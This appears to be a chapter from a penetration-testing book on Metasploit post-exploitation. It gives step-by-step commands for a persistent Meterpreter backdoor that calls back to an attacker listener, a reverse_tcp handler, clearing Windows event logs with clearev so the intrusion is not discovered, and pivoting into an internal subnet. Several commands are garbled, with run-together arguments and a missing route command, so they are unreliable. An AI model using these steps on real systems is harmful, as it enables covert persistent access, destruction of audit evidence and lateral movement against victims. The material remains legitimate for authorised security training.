    Chapter 34


    Persistent Backdoor


    ![](image_rsrc49Z.jpg)


    After successfully obtaining access to the target system, the penetration tester
    certainly does not want to regain access in the same laborious way. Since Meterpreter
    is a connection established based on a memory DLL, as long as the target host
    is shut down, the Meterpreter connection will be disconnected.


    Therefore, in order to facilitate subsequent penetration testing, a durable backdoor
    can be created. In this way, as long as the target host is powered on, it will
    automatically establish a connection with the attacking host. Moreover, when a
    persistent backdoor is created, even if the connection is interrupted, it will
    not affect the work. The following will introduce the use of run persistence command
    to create a persistent backdoor.


    Among them, the syntax format is as follows: ￼


    run persistence -X -i -p -r


    Use the run persistence command to create a persistent backdoor.


    The execution command is as follows: ￼


    meterpreter> run persistence -X -i 5-p 8888192.168.29.134￼


    From the output information, we can see that an executable script is created in
    the target host. Among them, the script file name is MIknXebtV.vbs. At this point,
    the user can see the file in the C:\Windows\TEMP directory of the target host.
    ￼


    After the user creates a persistent backdoor on the target host, it also needs
    to establish a listener locally. In this way, when the target host restarts, it
    can automatically establish a connection with the attacking host. The following
    will use the exploit/multi/handler module to establish a monitor.


    1) Select the exploit/multi/handler module.


    The execution command is as follows: ￼


    msf5> use exploit/multi/handler￼ msf5 exploit(multi/handler)>


    2) Load the attack payload and view the configuration options.


    The execution command is as follows: ￼


    msf5 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp￼


    As you can see from the output information, the required item LHOST has not been
    configured yet. Moreover, the port monitored by this module is 4444\. Since port
    4444 has been monitored before, we will modify another monitoring port, such as
    8888.


    3) Configure attack payload options.


    The execution command is as follows: ￼


    msf5 exploit(multi/handler)> set LHOST 192.168.29.134￼ LHOST => 192.168.29.134￼
    msf5 exploit(multi/handler)> set LPORT 8888￼ LPORT => 8888


    4) Establish monitoring.


    The execution command is as follows: ￼


    msf5 exploit(multi/handler)> exploit￼


    [＊] Started reverse TCP handler on 192.168.29.134:8888


    From the output information, we can see that the current host is listening on
    port 8888 and the IP address is 192.168.29.134.


    5) When the target host restarts, it will actively establish a connection with
    the attacking host. as follows: ￼


    [＊] Sending stage (179779 bytes) to 192.168.29.143￼


    From the output information, we can see that a Meterpreter session was successfully
    opened.


    # Clear trace


    When the penetration tester invades the target host, all operations will be recorded
    in the log file of the target system. Therefore, in order not to be discovered
    by the target system, it is very important to clear the trace. At this point,
    the user can use the clearev command to clear the trace.


    The execution command is as follows:


    meterpreter> clearev￼


    You can see the cleared related records from the output information. Among them,
    90 application records, 681 system records and 191 security records were cleared.


    Build a springboard


    Springboard refers to using a vulnerable host that has been attacked as a springboard
    to penetrate other hosts in the network. It can also be used to infiltrate intranet
    systems that cannot be directly accessed due to routing issues. The method of
    building a springboard will be introduced below.


    The specific steps are as follows:


    1) Open the obtained Meterpreter session.


    The execution command is as follows: ￼


    [＊] Meterpreter session 1 opened (192.168.2.10:4444-> 192.168.1.10:1051)￼ at 2019-04-17
    15:56:24 +0800￼ meterpreter>


    From the addresses of the above session, you can see that the address of the attacking
    host is 192.168.2.10, and the address of the target host is 192.168.1.10\. Obviously
    the two hosts do not belong to the same network. Therefore, if you want to infiltrate
    other hosts in the network where the target host is located, you need to add corresponding
    routing entries to achieve this.


    2) Check the subnet on the target system.


    The execution command is as follows: ￼


    meterpreter> run get_local_subnets￼


    From the output information, you can see that the subnet where the target system
    is located is 192.168.1.0/24.


    3) Put the attack session to run in the background and add routing entries. Among
    them, the syntax format of adding a route entry is as follows: ￼ route add [subnet][mask]
    [session ID]


    Add routing entries.


    The execution command is as follows: ￼


    meterpreter> background [＊ ] Route added


    From the output information, you can see that a routing entry was successfully
    added. At this point, the user can use the route print command to view the added
    route entries. as follows:


    msf5 exploit(handler)> route print


    ￼ From the output information, you can see that the route entry of 192.168.1.0/24
    has been successfully added. Next, the attacking host can infiltrate other hosts
    in the 192.168.1.0/24 network.


    Tip: In the above example, use the route add command to add a route to the attack
    session of Meterpreter. If you want to complete this operation more automatically,
    you can choose to use the load auto_add_route command. as follows: ￼


    msf5 exploit(handler)> load auto_add_route￼


    [＊] Successfully loaded plugin: auto_add_route'
